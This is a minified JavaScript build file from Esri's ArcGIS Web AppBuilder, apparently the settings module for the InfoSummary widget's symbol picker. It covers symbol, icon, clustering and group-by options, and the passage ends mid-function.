// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/InfoSummary/setting/MySymbolPicker.html":'\x3cdiv style\x3d"width: 100%;"\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"tabParent"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"symbolPickerContainer" class\x3d"symbolPickerContainer"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"div_symbolOptionsContainer" class\x3d"symbolOptionsContainer"\x3e\r\n        \x3cdiv class\x3d"label iconOptionsText"\x3e\r\n          ${nls.symbolOptionsText}\r\n        \x3c/div\x3e\r\n        \x3chr /\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"div_symbolOptions" class\x3d"symbolOptions"\x3e\r\n          \x3c!--Symbol Options--\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10"\r\n               data-dojo-attach-point\x3d"grpSymbolOptions"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"div_rdoLayerSym" class\x3d"height30"\x3e\r\n              \x3cinput name\x3d"a" data-dojo-type\x3d"dijit/form/RadioButton"\r\n                     data-dojo-attach-point\x3d"rdoLayerSym"\r\n                     data-dojo-attach-event\x3d"onChange:_rdoLayerSymChanged"\r\n                     title\x3d"${nls.rdoLayer}" /\x3e\r\n              \x3cspan class\x3d"label"\x3e${nls.rdoLayer}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"jimu-r-row symPick marginLR20" data-dojo-attach-point\x3d"layerSym"\x3e \x3c/div\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpSymbolOptions"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"div_rdoEsriSym" class\x3d"height30"\x3e\r\n              \x3cinput name\x3d"a" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoEsriSym" data-dojo-attach-event\x3d"onChange:_rdoEsriSymChanged" title\x3d"${nls.rdoEsri}" /\x3e\r\n              \x3cspan class\x3d"label"\x3e${nls.rdoEsri}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"symbolPicker" data-dojo-type\x3d"jimu/dijit/SymbolPicker" class\x3d"jimu-r-row symPick marginLR20"\x3e\x3c/div\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"parent_div_uploadCustomSymbol"\x3e\r\n            \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpSymbolOptions"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"div_rdoCustomSym" class\x3d"rdoCustomSym"\x3e\r\n                \x3cinput name\x3d"a" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoCustomSym" data-dojo-attach-event\x3d"onChange:_rdoCustomSymChanged" title\x3d"${nls.rdoCustom}" /\x3e\r\n                \x3cspan class\x3d"label"\x3e${nls.rdoCustom}\x3c/span\x3e\r\n              \x3c/div\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"customSymbolDIV" class\x3d"jimu-r-row padTop10 sHeight marginLR20"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"uploadCustomSymbol" class\x3d"uploadCustom"\x3e\x3c/div\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"customSymbolPlaceholder" class\x3d"customPlaceholder"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n\r\n          \x3c!--Clustering Options--\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"parent_div_clusterOptions" class\x3d"clusterOptions"\x3e\r\n            \x3chr class\x3d"w" /\x3e\r\n            \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpClusterOptions"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"div_chkCluster" class\x3d"padTop20"\x3e\r\n                \x3cinput data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-attach-point\x3d"chkClusterSym" title\x3d"${nls.chkCluster}" data-dojo-attach-event\x3d"onChange:_chkClusterChanged" /\x3e\r\n                \x3cspan class\x3d"label"\x3e${nls.chkCluster}\x3c/span\x3e\r\n              \x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cdiv data-dojo-attach-point\x3d"clusterPickerContainer" class\x3d"jimu-r-row marginLR22 grpClusterOptions"\x3e\r\n              \x3cdiv class\x3d"jimu-float-leading"\x3e${nls.defineClusterSymbol}:\x3c/div\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"clusterPicker" data-dojo-type\x3d"jimu/dijit/SymbolPicker" class\x3d"jimu-float-trailing colorPick"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cdiv class\x3d"jimu-r-row grpClusterOptions marginLR22" data-dojo-attach-point\x3d"grpClusterOptions"\x3e\r\n              \x3cinput data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-attach-point\x3d"chkClusterCnt" title\x3d"${nls.displayClusterCnt}" data-dojo-attach-event\x3d"onChange:_chkClusterCntChanged" /\x3e\r\n              \x3cspan class\x3d"label"\x3e${nls.displayClusterCnt}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"jimu-r-row grpClusterOptions" data-dojo-attach-point\x3d"featureFont" style\x3d"display: none; margin-left: 45px; margin-right: 45px;"\x3e\r\n              \x3cdiv class\x3d"jimu-float-leading"\x3e${nls.defineClusterFont}:\x3c/div\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"colorPicker" data-dojo-type\x3d"jimu/dijit/ColorPicker" data-dojo-props\x3d\'color:"${_highLightColor}"\' class\x3d"marginLR30 colorPick2 jimu-float-trailing"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n\r\n        \x3cdiv class\x3d"label iconOptionsText padTop20" data-dojo-attach-point\x3d"iconOptionsTextLabel"\x3e\r\n          ${nls.iconOptionsText}\r\n        \x3c/div\x3e\r\n        \x3chr /\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"div_iconOptions" class\x3d"iconOptions"\x3e\r\n          \x3c!--Main Panel and cluster center Icon Options--\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpIconOptions"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"div_rdoLayerIcon"\x3e\r\n              \x3cinput name\x3d"b" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoLayerIcon" data-dojo-attach-event\x3d"onChange:_rdoLayerIconChanged" title\x3d"${nls.rdoLayerIcon}" /\x3e\r\n              \x3cspan class\x3d"label" data-dojo-attach-point\x3d"rdoLayerIconLabel"\x3e${nls.rdoLayerIcon}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpCustomIconOptions"\x3e\r\n            \x3cdiv class\x3d"rdoCustomSym" data-dojo-attach-point\x3d"div_rdoCustomIcon"\x3e\r\n              \x3cinput name\x3d"b" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoCustomIcon" data-dojo-attach-event\x3d"onChange:_rdoCustomIconChanged" title\x3d"${nls.rdoCustomIcon}" /\x3e\r\n              \x3cspan class\x3d"label" data-dojo-attach-point\x3d"rdoCustomIconLabel"\x3e${nls.rdoCustomIcon}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10 sHeight marginLR30"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"uploadCustomIcon" class\x3d"uploadCustom"\x3e\x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"customIconPlaceholder" class\x3d"customPlaceholder"\x3e\x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"panelFeatureDisplayContainer" class\x3d"panelFeatureContainer"\x3e\r\n      \x3cdiv class\x3d"label iconOptionsText padTop10" data-dojo-attach-point\x3d"featureOptionsTextLabel"\x3e\r\n        ${nls.featureOptionsText}\r\n      \x3c/div\x3e\r\n      \x3chr /\x3e\r\n      \x3cdiv class\x3d"btn-add-section enable" data-dojo-attach-point\x3d"btnAddField"\x3e\r\n        \x3cspan class\x3d"btn-add-icon"\x3e\x3c/span\x3e\r\n        \x3cspan class\x3d"btn-add-label"\x3e${nls.addField}\x3c/span\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"fieldOptions" class\x3d"fieldOptions"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"label iconOptionsText padTop20" data-dojo-attach-point\x3d"groupOptionsTextLabel"\x3e\r\n        ${nls.groupOptionsText}\r\n      \x3c/div\x3e\r\n      \x3chr /\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"groupOptions" class\x3d"groupOptions"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"div_chkGroup"\x3e\r\n          \x3cinput data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-attach-point\x3d"chkGroup" title\x3d"${nls.chkGroup}" data-dojo-attach-event\x3d"onChange:_chkGroupChanged" /\x3e\r\n          \x3cspan class\x3d"label" data-dojo-attach-point\x3d"chkGroupLabel"\x3e${nls.chkGroup}\x3c/span\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"groupByOptions" class\x3d"groupByOptions"\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpField"\x3e\r\n            \x3cdiv class\x3d"rdoGroupField" data-dojo-attach-point\x3d"div_rdoGroupField"\x3e\r\n              \x3cinput name\x3d"c" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoGroupField" data-dojo-attach-event\x3d"onChange:_rdoGroupByFieldChanged" title\x3d"${nls.rdoGroupByField}" /\x3e\r\n              \x3cspan class\x3d"label" data-dojo-attach-point\x3d"rdoGroupFieldLabel"\x3e${nls.rdoGroupByField}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"groupFieldOptions" class\x3d"groupFieldOptions"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpRenderer"\x3e\r\n            \x3cdiv class\x3d"rdoGroupField" data-dojo-attach-point\x3d"div_rdoGroupRenderer"\x3e\r\n              \x3cinput name\x3d"c" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoGroupRenderer" data-dojo-attach-event\x3d"onChange:_rdoGroupByRendererChanged" title\x3d"${nls.rdoGroupByRenderer}" /\x3e\r\n              \x3cspan class\x3d"label" data-dojo-attach-point\x3d"rdoGroupRendererLabel"\x3e${nls.rdoGroupByRenderer}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3c!--Footer--\x3e\r\n  \x3cdiv class\x3d"footer padTop20"\x3e\r\n    \x3cdiv class\x3d"jimu-btn ok" data-dojo-attach-point\x3d"btnOk"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn cancel" data-dojo-attach-point\x3d"btnCancel"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin dijit/form/Select dijit/form/ValidationTextBox dojo/_base/lang dojo/_base/html dojo/dom-style dojo/dom-construct dojo/on dojo/dom dojox/gfx dojo/query dojo/_base/Color dijit/registry esri/symbols/jsonUtils esri/request esri/Color jimu/dijit/SymbolPicker jimu/BaseWidget jimu/dijit/TabContainer3 jimu/utils jimu/dijit/SimpleTable jimu/dijit/Message jimu/dijit/ColorPicker jimu/dijit/ImageChooser dojo/_base/array esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/PictureMarkerSymbol dojo/text!./MySymbolPicker.html dojo/Evented dojox/form/FileUploader".split(" "),
function(C,D,E,F,k,d,r,q,t,G,w,y,H,O,m,P,z,Q,I,J,A,B,K,R,l,L,u,v,x,M,N){return C([I,D,N],{templateString:M,baseClass:"jimu-widget-InfoSummary-setting",nls:null,row:null,layerInfo:null,clusteringEnabled:null,symbolInfo:null,symbolType:"",map:null,supportsDynamic:!0,tabContainer:null,field_options:[],groupFeaturesEnabled:!1,lyrSymbolSet:[],_highLightColor:"#ffffff",panelHTML:null,svg:null,constructor:function(a){this.nls=a.nls;this.row=a.callerRow;this.layerInfo=a.layerInfo;this.renderer=a.layerInfo.renderer;
this.geometryType=a.layerInfo.geometryType;this.symbolInfo=a.symbolInfo;this.map=a.map;this.ac=a.ac;this.layerId=a.value;this.supportsDynamic=a.layerInfo.supportsDynamic;this.fields=a.layerInfo.fields;this.hidePanel=a.hidePanel;this.oidFieldName=a.layerInfo.oidFieldName;this.popupFields=[];if(a.layerInfo.infoTemplate&&a.layerInfo.infoTemplate.info&&(a=a.layerInfo.infoTemplate.info.fieldInfos))for(var b=0;b<a.length;b++)a[b].visible&&this.popupFields.push(a[b].fieldName)},postMixInProperties:function(){this.inherited(arguments);
this.nls.common=window.jimuNls.common},postCreate:function(){this.inherited(arguments);this._initImageChoosers();this._setFields(this.fields);this._initTabControl();this._initSymbolPickerTab(this.geometryType);this._initFeatureOptionsTab();if(this.hidePanel)d.removeClass(this.btnAddField,"btn-add-section"),d.addClass(this.btnAddField,"btn-add-section-disabled"),d.addClass(this.iconOptionsTextLabel,"text-disabled"),d.addClass(this.featureOptionsTextLabel,"text-disabled"),d.addClass(this.groupOptionsTextLabel,
"text-disabled"),d.addClass(this.chkGroupLabel,"text-disabled"),d.addClass(this.rdoLayerIconLabel,"text-disabled"),d.addClass(this.rdoCustomIconLabel,"text-disabled");else{this.own(t(this.btnAddField,"click",k.hitch(this,this._addFieldRow,this.fieldOptionsTable,"loSelect")));var a=this.fieldOptionsTable.getRows();a&&3<=a.length?(d.removeClass(this.btnAddField,"btn-add-section"),d.addClass(this.btnAddField,"btn-add-section-disabled")):(d.removeClass(this.btnAddField,"btn-add-section-disabled"),d.addClass(this.btnAddField,
"btn-add-section"));d.removeClass(this.iconOptionsTextLabel,"text-disabled");d.removeClass(this.featureOptionsTextLabel,"text-disabled");d.removeClass(this.groupOptionsTextLabel,"text-disabled");d.removeClass(this.chkGroupLabel,"text-disabled");d.removeClass(this.rdoLayerIconLabel,"text-disabled");d.removeClass(this.rdoCustomIconLabel,"text-disabled")}this.chkGroup.set("disabled",this.hidePanel);this.rdoLayerIcon.set("disabled",this.hidePanel);this.rdoCustomIcon.set("disabled",this.hidePanel)},_initImageChoosers:function(){this.imageIconChooser=
new l({format:[l.GIF,l.JPEG,l.PNG],cropImage:!1,showTip:!1,goldenWidth:10,goldenHeight:15});d.addClass(this.imageIconChooser.domNode,"uploadCustom");d.place(this.imageIconChooser.domNode,this.uploadCustomIcon,"replace");this.imageSymbolChooser=new l({format:[l.GIF,l.JPEG,l.PNG],cropImage:!1,showTip:!1,goldenWidth:10,goldenHeight:15});d.addClass(this.imageSymbolChooser.domNode,"uploadCustom");d.place(this.imageSymbolChooser.domNode,this.uploadCustomSymbol,"replace")},_setFields:function(a){if(a){this.field_options=
[];for(var b=[""," ",void 0,null],c=0;c<a.length;c++)this.field_options.push({value:a[c].name,label:-1===b.indexOf(a[c].alias)?a[c].alias:a[c].name})}},_initTabControl:function(){this.tabContainer=new J({tabs:[{title:this.nls.symbolOptions,content:this.symbolPickerContainer},{title:this.nls.panelFeatureDisplay,content:this.panelFeatureDisplayContainer}],isNested:!0},this.tabParent);this.tabContainer.startup()},_initSymbolPickerTab:function(a){a=A.getTypeByGeometryType(a);this._loadLayerSymbol();this.supportsDynamic&&
this._initSymbolPicker(a);this._initClusterSymbolPicker(a);this._addEventHandlers(a);this._initSymbolUI()},_initFeatureOptionsTab:function(){this.isInitalLoad=!0;this.fieldLoadCount=0;this.fieldOptionsTable=new B({fields:[{name:"field",title:this.nls.selectField,"class":"label",type:"empty",width:"100px"},{name:"label","class":"label",title:this.nls.fieldLabel,type:"empty",width:"100px"},{name:"actions","class":"label",title:this.nls.actions,type:"actions",actions:["up","down","delete"],width:"50px"}],
selectable:!1,autoHeight:!0});this.fieldOptionsTable.placeAt(this.fieldOptions);this.fieldOptionsTable.startup();this.fieldOptionsTable.on("row-delete",k.hitch(this,this._rowDeleted));this.groupOptionsTable=new B({fields:[{name:"field",title:this.nls.selectField,"class":"label",type:"empty",width:"180px"},{name:"label","class":"label",title:this.nls.fieldLabel,type:"empty",width:"140px"}],selectable:!1,autoHeight:!0});this.groupOptionsTable.placeAt(this.groupFieldOptions);this.groupOptionsTable.startup();
this._initFeatureOptionsUI();this.isInitalLoad=!1},_initFeatureOptionsUI:function(){var a;this.symbolInfo&&this.symbolInfo.featureDisplayOptions&&(a=this.symbolInfo.featureDisplayOptions);if(a&&a.fields)for(var b=0;b<a.fields.length;b++)this._populateLayerRow(this.fieldOptionsTable,a.fields[b],"loSelect");else if(this._addFieldRow(this.groupOptionsTable,"goSelect"),this.popupFields&&0<this.popupFields.length)for(var b=2<this.popupFields.length?3:this.popupFields.length,c=0;c<b;c++)this._populateLayerRow(this.fieldOptionsTable,
{name:this.popupFields[c]},"loSelect");this.groupFeaturesEnabled=a&&"undefined"!==typeof a.groupEnabled?a.groupEnabled:!1;this._chkGroupChanged(this.groupFeaturesEnabled);this.chkGroup.set("checked",this.groupFeaturesEnabled);a&&a.groupField&&this._populateLayerRow(this.groupOptionsTable,a.groupField,"goSelect");b=!0;a&&"undefined"!==typeof a.groupByField&&(this._rdoGroupByFieldChanged(a.groupByField),b=!1);c=!1;this.renderer&&(this.renderer.attributeField||this.renderer.field||this.renderer.field1)&&
"undefined"===typeof this.renderer.visualVariables&&(c=!0);c||r.set(this.grpRenderer,"display","none");a&&"undefined"!==typeof a.groupByRenderer&&(this._rdoGroupByRendererChanged(a.groupByRenderer),b=!1);b&&this._rdoGroupByFieldChanged(b)},_rowDeleted:function(a){3>this.fieldOptionsTable.getRows().length&&(d.removeClass(this.btnAddField,"btn-add-section-disabled"),d.addClass(this.btnAddField,"btn-add-section"))},_populateLayerRow:function(a,b,c){this.fieldLoadCount+=1;a=a.addRow({});a.success&&a.tr&&
(a=a.tr,this._addFieldsOption(a,c),this._addLabelOption(a),a.selectFields.set("value",b.name),a.labelText.set("value",b.label))},_addFieldRow:function(a,b){if(a===this.fieldOptionsTable&&3<=a.getRows().length)new K({message:this.nls.max_records});else{this.isInitalLoad=!1;var c=a.addRow({});c.success&&c.tr&&(c=c.tr,this._addFieldsOption(c,b),this._addLabelOption(c));a===this.fieldOptionsTable&&3<=a.getRows().length&&(d.removeClass(this.btnAddField,"btn-add-section"),d.addClass(this.btnAddField,"btn-add-section-disabled"))}},
_addFieldsOption:function(a,b){var c=k.clone(this.field_options),g=y(".simple-table-cell",a)[0];g&&(d.setStyle(g,"verticalAlign","middle"),d.setStyle(g,"line-height","inherit"),b=new E({style:{width:"100%",height:"28px"},"class":b,options:c}),b.placeAt(g),b.startup(),a.selectFields=b,this.own(t(b,"change",k.hitch(this,function(){this.fieldLoadCount&&0<this.fieldLoadCount?--this.fieldLoadCount:a.labelText.set("value","");a.cells[0].title=a.cells[0].innerText}))),a.cells[0].title=a.cells[0].innerText)},
_addLabelOption:function(a){var b=y(".simple-table-cell",a)[1];d.setStyle(b,"verticalAlign","middle");d.setStyle(b,"line-height","inherit");var c=new F({style:{width:"100%",height:"28px"}});c.placeAt(b);c.startup();a.labelText=c},_initSymbolUI:function(){"undefined"!==typeof this.symbolInfo?(this.symbolType=this.symbolInfo.symbolType,this.clusterType=this.symbolInfo.clusterType,this.iconType=this.symbolInfo.iconType,this.displayFeatureCount=this.symbolInfo.displayFeatureCount,this.clusteringEnabled=
this.symbolInfo.clusteringEnabled,this.userDefinedSymbol=this.symbolInfo.userDefinedSymbol,this._highLightColor=this.symbolInfo._highLightColor,this._setSymbolType(this.symbolInfo.symbolType),this._setClusterType(this.symbolInfo.clusterType),this._setIconType(this.symbolInfo.iconType),"undefined"!==typeof this.symbolInfo.clusterType&&("CustomCluster"===this.symbolInfo.clusterType&&this.symbolInfo.clusterSymbol&&this.clusterPicker.showBySymbol(m.fromJson(this.symbolInfo.clusterSymbol)),this.userDefinedSymbol=
!0),this.chkClusterSym.set("checked",this.symbolInfo.clusteringEnabled),this._chkClusterChanged(this.symbolInfo.clusteringEnabled)):(this.rdoLayerSym.set("checked",!0),this._rdoEsriSymChanged(!1),this._rdoCustomSymChanged(!1),this.chkClusterSym.set("checked",!1),this.chkClusterCnt.set("checked",!1),this.rdoLayerIcon.set("checked",!0),this._rdoCustomIconChanged(!1),this.symbolType="LayerSymbol",this.iconType="LayerIcon",this.userDefinedSymbol=this.clusteringEnabled=!1);"esriGeometryPoint"===this.geometryType&&
this.supportsDynamic||(r.set(this.parent_div_uploadCustomSymbol,"display","none"),this.supportsDynamic||r.set(this.div_rdoEsriSym,"display","none"))},_setSymbolType:function(a){switch(a){case "LayerSymbol":this.symbolInfo.symbolOverride?(this.userDefinedSymbol=!0,this.rdoEsriSym.set("checked",!0),this._rdoLayerSymChanged(!1),this._rdoCustomSymChanged(!1),this.symbolPicker.showBySymbol(m.fromJson(this.symbolInfo.symbol))):(this.rdoLayerSym.set("checked",!0),this._rdoEsriSymChanged(!1),this._rdoCustomSymChanged(!1));
break;case "EsriSymbol":this.userDefinedSymbol=!0;this.rdoEsriSym.set("checked",!0);this._rdoLayerSymChanged(!1);this._rdoCustomSymChanged(!1);this.symbolPicker.showBySymbol(m.fromJson(this.symbolInfo.symbol));break;case "CustomSymbol":this.userDefinedSymbol=!0,this.rdoCustomSym.set("checked",!0),this._rdoEsriSymChanged(!1),this._rdoLayerSymChanged(!1),this._createImageDataDiv(this.symbolInfo.symbol,!0,this.customSymbolPlaceholder)}},_setIconType:function(a){switch(a){case "LayerIcon":this.rdoLayerIcon.set("checked",
!0);break;case "CustomIcon":this.userDefinedSymbol=!0,this.rdoCustomIcon.set("checked",!0),this.symbolInfo.icon&&(this.updateImg(),a=m.fromJson(this.symbolInfo.icon),this._createImageDataDiv(a,!0,this.customIconPlaceholder))}},_setClusterType:function(a){switch(a){case "ThemeCluster":this.userDefinedSymbol=!0;this.clusterType="ThemeCluster";break;case "CustomCluster":this.userDefinedSymbol=!0,this.clusterType="CustomCluster",this.chkClusterCnt.set("checked",this.displayFeatureCount),this.colorPicker.setColor(new H(this._highLightColor))}},
updateImg:function(){if(-1<this.symbolInfo.icon.toString().indexOf("\x3cimg")){var a=document.createElement("div");a.innerHTML=this.symbolInfo.icon;var b=new x(a.children[0].src,26,26);this.symbolInfo.icon=b.toJson();a.remove()}},_addEventHandlers:function(a){"point"===a&&this.own(t(this.imageSymbolChooser,"ImageChange",k.hitch(this,function(a){this.uploadImage("Symbol",a)})));this.own(t(this.imageIconChooser,"ImageChange",k.hitch(this,function(a){this.uploadImage("Icon",a)})));this.btnOk.innerText=
this.nls.common.ok;this.own(t(this.btnOk,"click",k.hitch(this,function(){this._setSymbol();this.emit("ok",this.symbolInfo)})));this.btnCancel.innerText=this.nls.common.cancel;this.own(t(this.btnCancel,"click",k.hitch(this,function(){this.emit("cancel")})))},_setSymbol:function(){var a;switch(this.symbolType){case "LayerSymbol":a=this.symbol;break;case "EsriSymbol":this.userDefinedSymbol=!0;a=this.symbolPicker.getSymbol();break;case "CustomSymbol":this.userDefinedSymbol=!0,0<this.customSymbolPlaceholder.children.length&&
(a="undefined"!==typeof this.customSymbolPlaceholder.children[0].src?new x(this.customSymbolPlaceholder.children[0].src,26,26):m.fromJson(this.symbolInfo.symbol))}var b;"LayerIcon"===this.iconType?b=a:0<this.customIconPlaceholder.children.length&&("undefined"!==typeof this.customIconPlaceholder.children[0].src?(d.removeClass(this.customIconPlaceholder.firstChild,"customPlaceholder"),d.addClass(this.customIconPlaceholder.firstChild,"customPlaceholderSettings"),b=new x(this.customIconPlaceholder.children[0].src,
26,26)):b=m.fromJson(this.symbolInfo.icon));this.clusteringEnabled&&"esriGeometryPoint"===this.geometryType?(this.clusterSymbol="ThemeCluster"===this.clusterType?"custom":this.clusterPicker.getSymbol().toJson(),this.userDefinedSymbol=!0):(this.clusterSymbol=void 0,this.clusteringEnabled=!1);a&&"undefined"!==typeof a.toJson&&(a=a.toJson());var c;c=0<this.customIconPlaceholder.children.length?this.customIconPlaceholder.children[0].src:0<this.layerSym.children.length?this.layerSym.children[0].innerHTML:
this.customIconPlaceholder.outerHTML;if("undefined"!==typeof b){var g="LayerIcon"!==this.iconType||"CustomSymbol"===this.symbolType;this._createImageDataDiv2(b,44,44,!0,g);this._createImageDataDiv2(b,28,28,!1,g)}var h;if("undefined"!==typeof this.ren)for(h=[],g=0;g<this.ren.length;g++){var e=this.ren[g],f,n,k;if("undefined"!==typeof e.value)n=isNaN(e.value)?"'"+e.value+"'":e.value,f="undefined"!==typeof e.label?e.label:e.value,n="undefined"!==typeof n?" \x3d\x3d\x3d "+n:void 0,k="undefined"!==typeof e.description&&
""!==e.description?e.description:void 0;else if("undefined"!==typeof e.classMaxValue){f=e.label;var p;f&&(p=f.split(" - "));p&&(n=1<p.length?" \x3e\x3d "+p[0]+" \x26\x26 \x3c\x3d "+p[1]:" \x3d\x3d\x3d "+p[0]);k="undefined"!==typeof e.description&&""!==e.description?e.description:void 0}h.push({value:n,label:f,description:k})}f=[];this.renderer&&this.renderer.attributeField?(f.push({name:this.renderer.attributeField}),this.renderer.attributeField2&&f.push({name:this.renderer.attributeField2}),this.renderer.attributeField3&&
f.push({name:this.renderer.attributeField3})):this.renderer&&this.renderer.field?f.push({name:this.renderer.field}):this.renderer&&this.renderer.field1&&f.push({name:this.renderer.field1});p=this.fieldOptionsTable?this._getFields(this.fieldOptionsTable):null;this.symbolInfo={symbolType:this.symbolType,symbol:a,clusterSymbol:this.clusterSymbol,clusteringEnabled:this.clusteringEnabled,displayFeatureCount:this.displayFeatureCount,_highLightColor:this.colorPicker.color.toHex(),icon:b&&b.toJson?b.toJson():
b,clusterType:this.clusterType,iconType:this.iconType,renderer:this.renderer,s:c,svg:this.svg,panelHTML:this.panelHTML,userDefinedSymbol:this.userDefinedSymbol?this.userDefinedSymbol:!1,layerId:this.layerId,selectedId:this.selectedID,featureDisplayOptions:{groupEnabled:this.groupFeaturesEnabled,listDisabled:p&&0<p.length?!1:!0,groupByRenderer:"undefined"===typeof this.groupByRenderer?!1:this.groupByRenderer,groupByField:"undefined"===typeof this.groupByField?!1:this.groupByField,fields:p,groupField:this.groupOptionsTable?
this._getFields(this.groupOptionsTable)[0]:null,groupByRendererOptions:{fields:f,values:h}}}},_getFields:function(a){a=a.getRows();var b=[];L.forEach(a,function(a){a.selectFields&&b.push({name:a.selectFields.value,label:a.labelText.value})});return b},_rdoLayerSymChanged:function(a){a&&(this.symbolType="LayerSymbol",this.selectedID&&this.setLayerSymbol(G.byId(this.selectedID)));d.setStyle(this.layerSym,"display",a?"block":"none")},_rdoEsriSymChanged:function(a){a&&(this.symbolType="EsriSymbol");d.setStyle(this.symbolPicker.domNode,
"display",a?"block":"none")},_rdoCustomSymChanged:function(a){a&&(this.symbolType="CustomSymbol");d.setStyle(this.customSymbolDIV,"display",a?"block":"none")},_chkClusterChanged:function(a){this.clusteringEnabled=a;d.setStyle(this.grpClusterOptions,"display",a?"block":"none");d.setStyle(this.featureFont,"display",a?"block":"none");d.setStyle(this.clusterPickerContainer,"display",a?"block":"none");a&&"undefined"===typeof this.clusterType&&(this.clusterType="CustomCluster")},_chkClusterCntChanged:function(a){this.displayFeatureCount=
a;d.setStyle(this.featureFont,"display",a&&this.clusteringEnabled?"block":"none")},_rdoLayerIconChanged:function(a){a&&(this.iconType="LayerIcon");d.setStyle(this.imageIconChooser.domNode,"display",a?"none":"block");d.setStyle(this.customIconPlaceholder,"display",a?"none":"block")},_rdoCustomIconChanged:function(a){a&&(this.iconType="CustomIcon");d.setStyle(this.imageIconChooser.domNode,"display",a?"block":"none");d.setStyle(this.customIconPlaceholder,"display",a?"block":"none")},_initSymbolPicker:function(a){this.symbolPicker.showByType("point"===
a?"marker":"polyline"===a?"line":"polygon"===a?"fill":"")},_initClusterSymbolPicker:function(a){"point"===a&&this.clusterPicker.showByType("fill");r.set(this.parent_div_clusterOptions,"display","point"===a?"block":"none")},_loadLayerSymbol:function(){this.ren=this.infos=void 0;if("undefined"!==typeof this.renderer){var a=this.renderer,b;if("undefined"!==typeof a.symbol)this._createImageDataDiv(a.symbol,!0,this.layerSym);else if("undefined"!==typeof a.infos)b=a.infos;else if("undefined"!==typeof a.uniqueValueInfos)b=
